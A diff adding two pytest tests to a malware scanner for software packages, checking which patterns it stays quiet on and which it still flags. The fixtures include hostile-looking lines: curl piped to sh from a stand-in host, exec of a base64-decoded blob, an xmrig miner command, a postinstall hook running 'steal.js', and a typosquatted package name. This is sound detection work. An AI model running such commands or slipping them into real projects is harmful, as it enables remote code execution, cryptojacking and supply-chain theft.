@@ -257,3 +257,34 @@ def test_guarddog_stderr_is_shown_when_it_produced_no_result(tmp_path: Path) -> 
         tf.add(tmp_path / "guarddog_npm.err", arcname="guarddog_npm.err")
     _, _, notes, _ = merge_findings(read_results(tgz))
     assert any("guarddog (npm)" in n and "boom" in n for n in notes)
+
+
+def test_held_out_false_positives_stay_quiet(tmp_path: Path) -> None:
+    """Found by scanning unseen projects (flask, axios, express, fastapi and the author's docs)."""
+    write(tmp_path, "docs.md", "install: curl -L https://x.invalid/i.sh | sh\n")
+    write(tmp_path, "app.py", 'exec(compile(config_file.read(), filename, "exec"), d.__dict__)\n')
+    write(tmp_path, "t.js", "const m = {'stratum+tcp://server:port': 'stratum+tcp'};\n")
+    write(
+        tmp_path,
+        "package.json",
+        json.dumps({"scripts": {"prepare": "husky"}, "dependencies": {"qs": "6", "preact": "10"}}),
+    )
+    sev = {f["rule"]: f["severity"] for f in findings(tmp_path)}
+    assert "typosquat?" not in sev  # two-letter names and preact are not typosquats
+    assert "cryptominer" not in sev and "npm-lifecycle-script" not in sev
+    assert sev == {"pipe-to-shell": "MEDIUM", "dyn-exec": "MEDIUM"}  # still listed, no longer alarming
+
+
+def test_still_flagged_after_the_held_out_tuning(tmp_path: Path) -> None:
+    write(tmp_path, "a.py", "exec(compile(base64.b64decode(blob), 'x', 'exec'))\n")
+    write(tmp_path, "m.sh", "./xmrig -o stratum+tcp://pool.invalid:3333\n")
+    write(tmp_path, "run.sh", "curl http://x.invalid/a | sh\n")  # a script, not a doc
+    write(
+        tmp_path,
+        "package.json",
+        json.dumps({"scripts": {"postinstall": "node steal.js"}, "dependencies": {"lodahs": "1"}}),
+    )
+    got = {f["rule"]: f["severity"] for f in findings(tmp_path)}
+    assert got["pipe-to-shell"] == "CRITICAL" and got["cryptominer"] == "HIGH"
+    assert got["npm-lifecycle-script"] == "HIGH" and got["typosquat?"] == "HIGH"
+    assert got.get("b64-exec") == "CRITICAL" or got["py-exec-compile"] in ("HIGH", "CRITICAL")
